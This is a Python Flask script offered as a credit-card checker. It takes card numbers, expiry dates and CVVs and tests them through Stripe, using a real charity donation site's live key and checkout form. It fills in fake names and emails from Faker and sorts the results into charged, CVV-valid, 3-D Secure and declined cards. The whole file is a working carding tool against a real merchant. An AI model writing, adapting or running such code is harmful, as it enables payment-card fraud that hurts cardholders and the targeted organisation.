from requests import Session as s
from random import randint as ran
from random import choices as cho
from faker import Faker
from flask import Flask
app = Flask(__name__)
faker = Faker()
s().follow_redirects = True
s().verify = False

def typ(cc):
    cc = str(cc)
    cc = cc[0]
    if cc == "3":
        card_type = "amex"
    elif cc == "4":
        card_type = "visa"
    elif cc == "5":
        card_type = "mastercard"
    elif cc == "6":
        card_type = "discover"
    else:
        card_type = "Unknown"
    return card_type
    
@app.route("/card=<cc>")
def check(cc):
    try:
        num, mon, yer, cvv = map(str.strip, cc.split("|"))
        name = faker.first_name().upper()
        email = name + ''.join(cho("qwertyuiopasdfghjklzxcvbnm123456789", k=10)) + "@gmail.com"
        
        url = "https://api.stripe.com/v1/payment_methods"
        data = {
'amount': '1',
  'currency': 'USD',
  'donationType': 'single',
  'formId': '2932',
  'gatewayId': 'stripe_payment_element',
  'firstName': 'Slayer',
  'lastName': 'Noob',
  'email': 'slayxhk@gmail.com',
  'donationBirthday': '',
  'originUrl': 'https://divinemercyfoundationfrbz.org/donate-now/',
  'isEmbed': 'true',
  'embedId': 'give-form-shortcode-1',
  'gatewayData[stripePaymentMethod]': 'card',
  'gatewayData[stripePaymentMethodIsCreditCard]': 'true',
  'gatewayData[formId]': '2932',
  'gatewayData[stripeKey]': 'pk_live_51O7SW7HBRqtFAAv51cwE2zbndWvQGvW89bj4TJpI4UW3ZX0gMSXwQ4rYRwVpeuqnLZgx1LITItM0aNU9dGWlYRWz00pOG9nWvX',
  'gatewayData[stripeConnectedAccountId]': 'acct_1O7SW7HBRqtFAAv5'
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 17 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/ZZHBZS Safari/619.2",
  'Accept': "application/json",
  'Accept-Encoding': "gzip, deflate, br, zstd",
  'sec-ch-ua-platform': "\"iOS\"",
  'sec-ch-ua-mobile': "?1",
  'origin': "https://divinemercyfoundationfrbz.org",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://divinemercyfoundationfrbz.org/?givewp-route=donation-form-view&form-id=2932",
  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
  'priority': "u=1, i",
  'Cookie': "__stripe_mid=b41897d3-f78e-457c-82d3-a3886d1e9d0f4e478a; __stripe_sid=fb64e7c0-b9f6-4e53-904d-0fa779339c4bd553b8"
        }
        response = s().post(url, headers=headers, data=data).json()
        id = response["id"]
        
        if not id:
            return f"Card: {cc} - Error: Unable to create payment method."
        
        url = "https://divinemercyfoundationfrbz.org/membership-account/membership-checkout/"
        data = {
    'level': '3',
    'checkjavascript': '1',
    'other_discount_code': '',
    'discount_code': '',
    'username': '',
    'bfirstname': name,
    'blastname': name,
    'bemail': email,
    'password': 'Op@88888',
    'password2': 'Op@88888',
    'bconfirmemail_copy': '1',
    'fullname': '',
    'baddress1': '',
    'baddress2': '',
    'bcity': '',
    'bstate': '',
    'bphone': '',
    'vat_number': '',
    'bzipcode': '10080',
    'bcountry': 'US',
    'CardType': typ(num),
    'submit-checkout': '1',
    'javascriptok': '1',
    'apbct_visible_fields': '{"0":{"visible_fields":"other_discount_code other_discount_code_button discount_code discount_code_button username bfirstname blastname bemail password password2 fullname baddress1 baddress2 bcity bstate bphone vat_number bzipcode bcountry","visible_fields_count":19,"invisible_fields":"level checkjavascript bconfirmemail_copy CardType submit-checkout javascriptok","invisible_fields_count":6}}',
    'payment_method_id': id,
    'AccountNumber': f'XXXXXXXXXXXX{num[12:]}',
    'ExpirationMonth': '03',
    'ExpirationYear': f'{yer if len(yer)==4 else str(20)+yer}',
}
        
        headers = {
    'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 17 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/ZZHBZS Safari/619.2",
	  'Accept': "application/json",
	  'Accept-Encoding': "gzip, deflate, br, zstd",
	  'sec-ch-ua-platform': "\"iOS\"",
	  'sec-ch-ua-mobile': "?1",
	  'origin': "https://js.stripe.com",
	  'sec-fetch-site': "same-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://js.stripe.com/",
	  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
	  'priority': "u=1, i",
}

        params = {
		    'level': '3',
		    }
    
        response = s().post(url, headers=headers,params=params,data=data).text.lower()
        with open("test.html","w") as f:
            f.write(response) 
        
        if any(msg in response for msg in ["succeeded","payment-success","successfully","thank you for your support","insufficient funds","insufficient_funds","payment-successfully","your card does not support this type of purchase","thank you","membership confirmation","/wishlist-member/?reg=","thank you for your payment","thank you for membership","payment received","your order has been received","purchase successful","your card is not supported"]):
               with open("charged.html","w") as f:
                   f.write(response)
               msg = "CHARGED"
               
        elif any(msg in response for msg in ["incorrect_cvc","invalid cvc","invalid_cvc","incorrect cvc","incorrect cvv","incorrect_cvv","invalid_cvv","invalid cvv",'"cvv_check":"pass"',"cvv_check: pass","security code is invalid","security code is incorrect","zip code is incorrect","zip code is invalid","card is declined by your bank","lost_card","stolen_card","transaction_not_allowed","pickup_card"]):
               with open("CCN/CVV.html","w") as f:
                   f.write(response)
               msg = "CCN/CVV"
               
        elif any(msg in response for msg in ["authentication required","three_d_secure","3d secure","stripe_3ds2_fingerprint"]):
               with open("3D LIVE.html","w") as f:
                   f.write(response)
               msg = "3D LIVE"
               
        elif any(msg in response for msg in ["declined","do_not_honor","generic_decline","decline by your bank","expired_card","your card has expired","incorrect_number","card number is incorrect","processing_error","service_not_allowed","lock_timeout","card was declined","fraudulent"]):
               msg = "DECLINED"
               
        else:
               msg = "DECLINED[UNKNOWN]"
               
        return {"Author":"Sahid","Status":msg,"Gateway":"Stripe Auth","Card":cc}
    
    except Exception as e:
        return {"Author":"Sahid","Status":str(e)}

if __name__ == "__main__":
    app.run(host="0.0.0.0",port=8008)
